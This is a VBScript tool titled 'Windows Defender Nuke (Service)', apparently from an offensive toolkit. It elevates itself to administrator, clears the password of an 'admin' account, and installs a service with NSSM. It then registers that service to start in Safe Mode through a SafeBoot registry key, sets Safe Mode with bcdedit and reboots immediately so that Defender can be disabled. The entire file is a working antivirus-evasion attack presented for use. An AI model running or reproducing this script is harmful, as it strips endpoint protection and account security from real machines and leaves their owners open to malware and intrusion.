' am@CyberOps.Team_ Windows Defender Nuke (Service)

' Elevate to admin
If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If

Dim Ans 
Ans = Msgbox ("This script will attempt to break Defender via Safemode using a service. Copy the contents of the zip to C:\temp\ and press OK.", vbYesNo, "Windows Defender Nuke (Service) - am@CyberOps.Team_")
If Ans = vbYes Then
	Set oShell = WScript.CreateObject ("WScript.Shell")
	'Switch off password
	oShell.run "cmd.exe /c net user admin """
	'Using NSSM to create service
	oShell.run "cmd.exe /c C:\temp\nssm.exe install WindowsDefenderNukeService WindowsDefenderNukeService.exe"
	'Add registry entry to boot service in safe mode
	oShell.run "cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\WindowsDefenderNukeService /v Default /t REG_SZ /d Service /f"
	'Set safe mode and reboot
	oShell.run "cmd.exe /c bcdedit /set {current} safeboot minimal"
	x=msgbox("Safemode set. The system will now enter safemode and run the DefenderNukeService. Press OK to start reboot. GL." ,0, "Safemode Set - am@CyberOps.Team_")
	oShell.run "cmd.exe /c shutdown -r -t 0"
Else 
	'Error
	x=msgbox("N00B. Try agian." ,0, "Registry values changed - am@yberOps.Team_")
End If

